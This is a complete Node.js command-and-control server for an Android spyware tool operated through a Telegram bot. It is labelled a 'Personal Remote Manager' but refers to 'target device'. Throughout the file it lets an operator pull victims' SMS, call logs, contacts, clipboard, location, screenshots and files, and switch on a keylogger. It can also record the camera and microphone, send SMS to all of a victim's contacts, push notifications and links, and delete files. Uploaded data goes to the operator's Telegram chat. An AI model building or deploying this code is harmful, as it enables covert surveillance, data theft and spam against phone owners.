const express = require('express');
const webSocket = require('ws');
const http = require('http');
const telegramBot = require('node-telegram-bot-api');
const { v4: uuidv4 } = require('uuid');
const multer = require('multer');
const bodyParser = require('body-parser');
const axios = require('axios');
const fs = require('fs');
const path = require('path');

process.on('uncaughtException', (err) => {
    console.error('❌ Uncaught Exception:', err);
});

process.on('unhandledRejection', (reason, promise) => {
    console.error('❌ Unhandled Rejection at:', promise, 'reason:', reason);
});

async function safeTelegramCall(promise, errorMessage = 'Telegram API error') {
    try {
        return await promise;
    } catch (error) {
        console.error(`${errorMessage}:`, error.message);
        return null;
    }
}

const token = process.env.bot_token;
const id = process.env.bot_id;
const address = 'https://www.google.com';

if (!token || !id) {
    console.error('❌ Please set bot_token and bot_id environment variables.');
    process.exit(1);
}

const app = express();
const appServer = http.createServer(app);
const appSocket = new webSocket.Server({ server: appServer });
const appBot = new telegramBot(token, { polling: true });

const appClients = new Map();
const userSessions = new Map();

appClients.set = function(key, value) {
    Map.prototype.set.call(this, key, { ...value, currentPath: '/' });
};

const upload = multer({
    dest: 'uploadedFile/',
    limits: { fileSize: 50 * 1024 * 1024 }
});
if (!fs.existsSync('uploadedFile')) {
    fs.mkdirSync('uploadedFile');
}

app.use(bodyParser.json());

function sendCommandToDevice(uuid, command, chatId, messageId = null) {
    let sent = false;
    appSocket.clients.forEach(ws => {
        if (ws.uuid === uuid) {
            ws.send(command);
            sent = true;
        }
    });

    if (messageId) {
        safeTelegramCall(
            appBot.deleteMessage(chatId, messageId),
            'Failed to delete message'
        );
    }

    safeTelegramCall(
        appBot.sendMessage(
            chatId,
            sent
                ? '°• Your request is on process...'
                : '°• Device not found!'
        ),
        'Failed to send command status'
    );
}

app.get('/', (req, res) => {
    res.send('<h1 align="center">Server uploaded successfully</h1>');
});

app.post('/uploadFile', upload.single('file'), async (req, res) => {
    try {
        const originalName = req.file.originalname;
        const tempPath = req.file.path;
        const safeName = encodeURIComponent(originalName);
        const finalPath = path.join(__dirname, 'uploadedFile', safeName);

        await fs.promises.rename(tempPath, finalPath);

        await safeTelegramCall(
            appBot.sendDocument(
                id,
                finalPath,
                {
                    caption: `°• Message from <b>${req.headers.model || 'unknown'}</b> device\n\nFile Name: ${originalName}`,
                    parse_mode: 'HTML'
                }
            ),
            'Failed to send document to Telegram'
        );

        await fs.promises.unlink(finalPath);

        res.send('');
    } catch (error) {
        console.error('Error handling file upload:', error);
        res.status(500).send('Internal server error');
    }
});

app.post('/listFiles', async (req, res) => {
    try {
        const { uuid, files, currentPath } = req.body;
        const chatId = id;

        if (!appClients.has(uuid)) {
            return res.status(404).send('Device not found');
        }

        const device = appClients.get(uuid);
        device.currentPath = currentPath || device.currentPath;
        appClients.set(uuid, device);

        const inlineKeyboard = [];
        let row = [];

        files.forEach((file, index) => {
            const buttonText = file.isDir ? `📁 ${file.name}` : `📄 ${file.name}`;
            const callbackData = file.isDir ? `filedir:${uuid}:${file.path}` : `fileget:${uuid}:${file.path}`;
            row.push({ text: buttonText, callback_data: callbackData });

            if (row.length === 2 || index === files.length - 1) {
                inlineKeyboard.push([...row]);
                row = [];
            }
        });

        const navButtons = [];
        if (currentPath !== '/') {
            navButtons.push({ text: '⬆️ Back', callback_data: `filedir:${uuid}:${path.dirname(currentPath)}` });
        }
        navButtons.push({ text: '🔄 Refresh', callback_data: `filedir:${uuid}:${currentPath}` });
        navButtons.push({ text: '🔙 Cancel', callback_data: `filecancel:${uuid}` });
        inlineKeyboard.push(navButtons);

        await safeTelegramCall(
            appBot.sendMessage(
                chatId,
                `°• Files on <b>${device.model}</b>\nCurrent path: <code>${currentPath}</code>`,
                {
                    parse_mode: 'HTML',
                    reply_markup: { inline_keyboard: inlineKeyboard }
                }
            ),
            'Failed to send file list'
        );

        res.send('');
    } catch (error) {
        console.error('Error in /listFiles:', error);
        res.status(500).send('Internal server error');
    }
});

app.post('/uploadText', (req, res) => {
    safeTelegramCall(
        appBot.sendMessage(
            id,
            `°• Message from <b>${req.headers.model || 'unknown'}</b> device\n\n${req.body.text}`,
            {
                parse_mode: 'HTML',
                reply_markup: {
                    keyboard: [['Connected devices'], ['Execute command', '📁 File Manager']],
                    resize_keyboard: true,
                },
                disable_web_page_preview: true,
            }
        ),
        'Failed to send text message'
    );
    res.send('');
});

app.post('/uploadLocation', (req, res) => {
    safeTelegramCall(
        appBot.sendLocation(id, req.body.lat, req.body.lon),
        'Failed to send location'
    );
    safeTelegramCall(
        appBot.sendMessage(
            id,
            `°• Location from <b>${req.headers.model || 'unknown'}</b> device`,
            {
                parse_mode: 'HTML',
                reply_markup: {
                    keyboard: [['Connected devices'], ['Execute command', '📁 File Manager']],
                    resize_keyboard: true,
                },
            }
        ),
        'Failed to send location confirmation'
    );
    res.send('');
});

appSocket.on('connection', (ws, req) => {
    const uuid = uuidv4();
    const { model, battery, version, brightness, provider } = req.headers;

    ws.uuid = uuid;
    appClients.set(uuid, { model, battery, version, brightness, provider, currentPath: '/' });

    safeTelegramCall(
        appBot.sendMessage(
            id,
            `°• New device connected\n\n` +
                `• Device model : <b>${model || 'unknown'}</b>\n` +
                `• Battery : <b>${battery || 'unknown'}</b>\n` +
                `• Android version : <b>${version || 'unknown'}</b>\n` +
                `• Screen brightness : <b>${brightness || 'unknown'}</b>\n` +
                `• Provider : <b>${provider || 'unknown'}</b>`,
            { parse_mode: 'HTML' }
        ),
        'Failed to send new device notification'
    );

    ws.on('close', () => {
        safeTelegramCall(
            appBot.sendMessage(
                id,
                `°• Device disconnected\n\n` +
                    `• Device model : <b>${model || 'unknown'}</b>\n` +
                    `• Battery : <b>${battery || 'unknown'}</b>\n` +
                    `• Android version : <b>${version || 'unknown'}</b>\n` +
                    `• Screen brightness : <b>${brightness || 'unknown'}</b>\n` +
                    `• Provider : <b>${provider || 'unknown'}</b>`,
                { parse_mode: 'HTML' }
            ),
            'Failed to send device disconnection notification'
        );
        appClients.delete(uuid);
    });
});

appBot.on('message', (message) => {
    const chatId = message.chat.id;

    if (chatId != id) {
        safeTelegramCall(
            appBot.sendMessage(chatId, '°• Permission denied'),
            'Failed to send permission denied'
        );
        return;
    }

    if (!userSessions.has(chatId)) {
        userSessions.set(chatId, { currentUuid: '', currentNumber: '', currentTitle: '', nextStep: null });
    }
    const session = userSessions.get(chatId);

    if (message.reply_to_message && session.nextStep) {
        session.nextStep(message, session);
        return;
    }

    if (message.text === '/start') {
        safeTelegramCall(
            appBot.sendMessage(
                id,
                '°• Welcome to Personal Remote Manager\n\n' +
                    '• If the application is installed on your personal device, wait for the connection.\n\n' +
                    '• When you receive the connection message, it means that your device is connected and ready to receive commands.\n\n' +
                    '• Click on the command button and select the desired device then select the desired command.\n\n' +
                    '• If you get stuck somewhere, send /start command.\n\n' +
                    '• For personal use only.',
                {
                    parse_mode: 'HTML',
                    disable_web_page_preview: true,
                    reply_markup: {
                        keyboard: [['Connected devices'], ['Execute command', '📁 File Manager']],
                        resize_keyboard: true,
                    },
                }
            ),
            'Failed to send start message'
        );
    } else if (message.text === 'Connected devices') {
        if (appClients.size === 0) {
            safeTelegramCall(
                appBot.sendMessage(id, '°• No connected devices available'),
                'Failed to send no devices message'
            );
        } else {
            let text = '°• List of connected devices :\n\n';
            appClients.forEach((value, key) => {
                text += `• Device model : <b>${value.model || 'unknown'}</b>\n` +
                    `• Battery : <b>${value.battery || 'unknown'}</b>\n` +
                    `• Android version : <b>${value.version || 'unknown'}</b>\n` +
                    `• Screen brightness : <b>${value.brightness || 'unknown'}</b>\n` +
                    `• Provider : <b>${value.provider || 'unknown'}</b>\n\n`;
            });
            safeTelegramCall(
                appBot.sendMessage(id, text, { parse_mode: 'HTML' }),
                'Failed to send devices list'
            );
        }
    } else if (message.text === 'Execute command') {
        if (appClients.size === 0) {
            safeTelegramCall(
                appBot.sendMessage(id, '°• No connected devices available'),
                'Failed to send no devices message'
            );
        } else {
            const deviceListKeyboard = [];
            appClients.forEach((value, key) => {
                deviceListKeyboard.push([{ text: value.model || 'unknown', callback_data: `device:${key}` }]);
            });
            safeTelegramCall(
                appBot.sendMessage(id, '°• Select device to execute command', {
                    reply_markup: { inline_keyboard: deviceListKeyboard },
                }),
                'Failed to send device selection'
            );
        }
    } else if (message.text === '📁 File Manager') {
        if (appClients.size === 0) {
            safeTelegramCall(
                appBot.sendMessage(id, '°• No connected devices available'),
                'Failed to send no devices message'
            );
        } else {
            const deviceListKeyboard = [];
            appClients.forEach((value, key) => {
                deviceListKeyboard.push([{ text: value.model || 'unknown', callback_data: `fm_device:${key}` }]);
            });
            safeTelegramCall(
                appBot.sendMessage(id, '°• Select device to browse files', {
                    reply_markup: { inline_keyboard: deviceListKeyboard },
                }),
                'Failed to send device selection for file manager'
            );
        }
    }
});

appBot.on('callback_query', async (callbackQuery) => {
    const msg = callbackQuery.message;
    const chatId = msg.chat.id;

    if (chatId != id) {
        await safeTelegramCall(
            appBot.answerCallbackQuery(callbackQuery.id, { text: 'Unauthorized!' }),
            'Failed to answer unauthorized callback'
        );
        return;
    }

    const data = callbackQuery.data;
    const [command, ...params] = data.split(':');
    const uuid = params[0];

    if (!userSessions.has(chatId)) {
        userSessions.set(chatId, { currentUuid: '', currentNumber: '', currentTitle: '', nextStep: null });
    }
    const session = userSessions.get(chatId);

    const inputCommands = ['send_message', 'send_message_to_all', 'open_target_link', 'text_to_speech', 'file', 'delete_file', 'microphone', 'rec_camera_selfie', 'rec_camera_main', 'toast', 'show_notification', 'play_audio'];
    const immediateCommands = ['calls', 'contacts', 'messages', 'apps', 'device_info', 'clipboard', 'camera_main', 'camera_selfie', 'location', 'vibrate', 'stop_audio', 'torch_on', 'torch_off', 'keylogger_on', 'keylogger_off', 'screenshot'];

    try {
        if (command === 'fm_device') {
            const device = appClients.get(uuid);
            if (!device) {
                await safeTelegramCall(
                    appBot.answerCallbackQuery(callbackQuery.id, { text: 'Device disconnected!' }),
                    'Failed to answer fm_device'
                );
                return;
            }

            sendCommandToDevice(uuid, `list_files:${device.currentPath}`, chatId, msg.message_id);

            await safeTelegramCall(
                appBot.answerCallbackQuery(callbackQuery.id),
                'Failed to answer fm_device'
            );
            return;
        }

        if (command === 'filedir') {
            const targetPath = params[1];
            const device = appClients.get(uuid);
            if (!device) {
                await safeTelegramCall(
                    appBot.answerCallbackQuery(callbackQuery.id, { text: 'Device disconnected!' }),
                    'Failed to answer filedir'
                );
                return;
            }

            await safeTelegramCall(
                appBot.deleteMessage(chatId, msg.message_id),
                'Failed to delete file list message'
            );

            sendCommandToDevice(uuid, `list_files:${targetPath}`, chatId);

            await safeTelegramCall(
                appBot.answerCallbackQuery(callbackQuery.id),
                'Failed to answer filedir'
            );
            return;
        }

        if (command === 'fileget') {
            const filePath = params[1];
            const device = appClients.get(uuid);
            if (!device) {
                await safeTelegramCall(
                    appBot.answerCallbackQuery(callbackQuery.id, { text: 'Device disconnected!' }),
                    'Failed to answer fileget'
                );
                return;
            }

            sendCommandToDevice(uuid, `get_file:${filePath}`, chatId, msg.message_id);

            await safeTelegramCall(
                appBot.answerCallbackQuery(callbackQuery.id),
                'Failed to answer fileget'
            );
            return;
        }

        if (command === 'filecancel') {
            await safeTelegramCall(
                appBot.deleteMessage(chatId, msg.message_id),
                'Failed to delete file manager message'
            );
            await safeTelegramCall(
                appBot.answerCallbackQuery(callbackQuery.id),
                'Failed to answer filecancel'
            );
            return;
        }

        if (command === 'device') {
            const deviceInfo = appClients.get(uuid);
            if (!deviceInfo) {
                await safeTelegramCall(
                    appBot.answerCallbackQuery(callbackQuery.id, { text: 'Device disconnected!' }),
                    'Failed to answer device'
                );
                return;
            }
            await safeTelegramCall(
                appBot.editMessageText(
                    `°• Select command for device : <b>${deviceInfo.model || 'unknown'}</b>`,
                    {
                        chat_id: chatId,
                        message_id: msg.message_id,
                        reply_markup: {
                            inline_keyboard: [
                                [{ text: '📁 File Manager', callback_data: `fm_device:${uuid}` }],
                                [{ text: 'Apps', callback_data: `apps:${uuid}` }, { text: 'Device info', callback_data: `device_info:${uuid}` }],
                                [{ text: 'Get file', callback_data: `file:${uuid}` }, { text: 'Delete file', callback_data: `delete_file:${uuid}` }],
                                [{ text: 'Clipboard', callback_data: `clipboard:${uuid}` }, { text: 'Microphone', callback_data: `microphone:${uuid}` }],
                                [{ text: 'Main camera', callback_data: `camera_main:${uuid}` }, { text: 'Selfie camera', callback_data: `camera_selfie:${uuid}` }],
                                [{ text: 'Record Main camera', callback_data: `rec_camera_main:${uuid}` }, { text: 'Record Selfie camera', callback_data: `rec_camera_selfie:${uuid}` }],
                                [{ text: 'Location', callback_data: `location:${uuid}` }, { text: 'Toast', callback_data: `toast:${uuid}` }],
                                [{ text: 'Calls', callback_data: `calls:${uuid}` }, { text: 'Contacts', callback_data: `contacts:${uuid}` }],
                                [{ text: 'Vibrate', callback_data: `vibrate:${uuid}` }, { text: 'Show notification', callback_data: `show_notification:${uuid}` }],
                                [{ text: 'Messages', callback_data: `messages:${uuid}` }, { text: 'Send message', callback_data: `send_message:${uuid}` }],
                                [{ text: 'Play audio', callback_data: `play_audio:${uuid}` }, { text: 'Stop audio', callback_data: `stop_audio:${uuid}` }],
                                [{ text: 'Screenshot', callback_data: `screenshot:${uuid}` }],
                                [{ text: 'Torch On', callback_data: `torch_on:${uuid}` }, { text: 'Torch Off', callback_data: `torch_off:${uuid}` }],
                                [{ text: 'KeyLogger On', callback_data: `keylogger_on:${uuid}` }, { text: 'KeyLogger Off', callback_data: `keylogger_off:${uuid}` }],
                                [{ text: 'Open Target Link', callback_data: `open_target_link:${uuid}` }, { text: 'Text To Speech', callback_data: `text_to_speech:${uuid}` }],
                                [{ text: 'Send message to all contacts', callback_data: `send_message_to_all:${uuid}` }],
                                [{ text: 'Device Buttons', callback_data: `device_button:${uuid}` }],
                            ],
                        },
                        parse_mode: 'HTML',
                    }
                ),
                'Failed to edit device command menu'
            );
            await safeTelegramCall(
                appBot.answerCallbackQuery(callbackQuery.id),
                'Failed to answer device'
            );
            return;
        }

        if (inputCommands.includes(command)) {
            await safeTelegramCall(
                appBot.deleteMessage(chatId, msg.message_id),
                'Failed to delete message'
            );

            const prompts = {
                send_message: '°• Please reply the number to which you want to send the SMS',
                send_message_to_all: '°• Enter the message you want to send to all contacts',
                open_target_link: '°• Enter the link you want to send',
                text_to_speech: '°• Enter the Text to Speak',
                file: '°• Enter the path of the file you want to download',
                delete_file: '°• Enter the path of the file you want to delete',
                microphone: '°• Enter how long you want the microphone to be recorded',
                rec_camera_selfie: '°• Enter how long you want the selfie camera to be recorded',
                rec_camera_main: '°• Enter how long you want the main camera to be recorded',
                toast: '°• Enter the message that you want to appear on the target device',
                show_notification: '°• Enter the message you want to appear as notification',
                play_audio: '°• Enter the audio link you want to play',
            };

            if (command === 'send_message') {
                session.currentUuid = uuid;
                session.nextStep = (msg1, sess1) => {
                    sess1.currentNumber = msg1.text;
                    sess1.nextStep = (msg2, sess2) => {
                        sendCommandToDevice(
                            sess2.currentUuid,
                            `send_message:${sess2.currentNumber}/${msg2.text}`,
                            chatId
                        );
                        sess2.currentNumber = '';
                        sess2.currentUuid = '';
                        sess2.nextStep = null;
                    };
                    safeTelegramCall(
                        appBot.sendMessage(
                            chatId,
                            '°• Great, now enter the message you want to send to this number',
                            { reply_markup: { force_reply: true } }
                        ),
                        'Failed to send prompt'
                    );
                };
                safeTelegramCall(
                    appBot.sendMessage(chatId, prompts.send_message, { reply_markup: { force_reply: true } }),
                    'Failed to send prompt'
                );
                await safeTelegramCall(
                    appBot.answerCallbackQuery(callbackQuery.id),
                    'Failed to answer callback'
                );
                return;
            }

            const nextStepHandler = (replyMsg, sess) => {
                const userInput = replyMsg.text;
                let commandToSend = '';

                switch (command) {
                    case 'send_message_to_all':
                        commandToSend = `send_message_to_all:${userInput}`;
                        break;
                    case 'open_target_link':
                        commandToSend = `open_target_link:${userInput}`;
                        break;
                    case 'text_to_speech':
                        const ttsLink =
                            'https://translate.google.com/translate_tts?ie=UTF-8&tl=en&tk=995126.592330&client=t&q=' +
                            encodeURIComponent(userInput);
                        commandToSend = `text_to_speech:${ttsLink}`;
                        break;
                    case 'file':
                        commandToSend = `file:${userInput}`;
                        break;
                    case 'delete_file':
                        commandToSend = `delete_file:${userInput}`;
                        break;
                    case 'microphone':
                    case 'rec_camera_selfie':
                    case 'rec_camera_main':
                        commandToSend = `${command}:${userInput}`;
                        break;
                    case 'toast':
                        commandToSend = `toast:${userInput}`;
                        break;
                    case 'show_notification':
                        sess.currentTitle = userInput;
                        sess.nextStep = (msg2, sess2) => {
                            const link = msg2.text;
                            sendCommandToDevice(
                                sess2.currentUuid,
                                `show_notification:${sess2.currentTitle}/${link}`,
                                chatId
                            );
                            sess2.currentTitle = '';
                            sess2.currentUuid = '';
                            sess2.nextStep = null;
                        };
                        safeTelegramCall(
                            appBot.sendMessage(
                                chatId,
                                '°• Great, now enter the link you want to be opened by the notification',
                                { reply_markup: { force_reply: true } }
                            ),
                            'Failed to send prompt'
                        );
                        return;
                    case 'play_audio':
                        commandToSend = `play_audio:${userInput}`;
                        break;
                }

                if (commandToSend) {
                    sendCommandToDevice(sess.currentUuid, commandToSend, chatId);
                    sess.currentUuid = '';
                    sess.nextStep = null;
                }
            };

            session.currentUuid = uuid;
            session.nextStep = nextStepHandler;
            safeTelegramCall(
                appBot.sendMessage(chatId, prompts[command], { reply_markup: { force_reply: true } }),
                'Failed to send prompt'
            );
            await safeTelegramCall(
                appBot.answerCallbackQuery(callbackQuery.id),
                'Failed to answer callback'
            );
            return;
        }

        if (immediateCommands.includes(command)) {
            sendCommandToDevice(uuid, command, chatId, msg.message_id);
            await safeTelegramCall(
                appBot.answerCallbackQuery(callbackQuery.id),
                'Failed to answer callback'
            );
            return;
        }

        if (command === 'my_fire_emoji') {
            await safeTelegramCall(
                appBot.deleteMessage(chatId, msg.message_id),
                'Failed to delete message'
            );
            await safeTelegramCall(
                appBot.sendMessage(
                    chatId,
                    '°• Your 🔥 is on process...\n🔥\n🔥🔥\n🔥🔥🔥',
                    {
                        reply_markup: {
                            keyboard: [['Connected devices'], ['Execute command', '📁 File Manager']],
                            resize_keyboard: true,
                        },
                    }
                ),
                'Failed to send fire message'
            );
            await safeTelegramCall(
                appBot.answerCallbackQuery(callbackQuery.id),
                'Failed to answer callback'
            );
        }

        if (command === 'device_button') {
            session.currentUuid = uuid;
            const device = appClients.get(uuid);
            await safeTelegramCall(
                appBot.editMessageText(
                    `°• Press buttons for device : <b>${device.model}</b>`,
                    {
                        chat_id: chatId,
                        message_id: msg.message_id,
                        reply_markup: {
                            inline_keyboard: [
                                [
                                    { text: '|||', callback_data: `device_btn_:recent:${uuid}` },
                                    { text: '■', callback_data: `device_btn_:home:${uuid}` },
                                    { text: '<', callback_data: `device_btn_:back:${uuid}` },
                                ],
                                [
                                    { text: 'Vol +', callback_data: `device_btn_:vol_up:${uuid}` },
                                    { text: 'Vol -', callback_data: `device_btn_:vol_down:${uuid}` },
                                    { text: '⊙', callback_data: `device_btn_:power:${uuid}` },
                                ],
                                [{ text: 'Exit 🔙', callback_data: `device_btn_:exit:${uuid}` }],
                            ],
                        },
                        parse_mode: 'HTML',
                    }
                ),
                'Failed to edit device buttons menu'
            );
            await safeTelegramCall(
                appBot.answerCallbackQuery(callbackQuery.id),
                'Failed to answer callback'
            );
        }

        if (command === 'device_btn_') {
            const btn = params[0];
            const targetUuid = params[1];
            if (btn === 'exit') {
                await safeTelegramCall(
                    appBot.deleteMessage(chatId, msg.message_id),
                    'Failed to delete message'
                );
            } else {
                const btnCommand = `btn_${btn}`;
                sendCommandToDevice(targetUuid, btnCommand, chatId, msg.message_id);
            }
            await safeTelegramCall(
                appBot.answerCallbackQuery(callbackQuery.id),
                'Failed to answer callback'
            );
        }
    } catch (error) {
        console.error('Error in callback_query handler:', error);
    }
});

setInterval(() => {
    appSocket.clients.forEach(ws => {
        try {
            ws.send('ping');
        } catch (err) {
            console.error('Error sending ping:', err.message);
        }
    });
    axios.get(address).catch(err => console.error('Periodic axios error:', err.message));
}, 5000);

let PORT = process.env.PORT ? parseInt(process.env.PORT) : 8999;
if (isNaN(PORT)) {
    console.error('❌ Invalid PORT environment variable. Using default 8999.');
    PORT = 8999;
}

appServer.listen(PORT, () => {
    console.log(`🚀 Server running on port ${PORT}`);
});
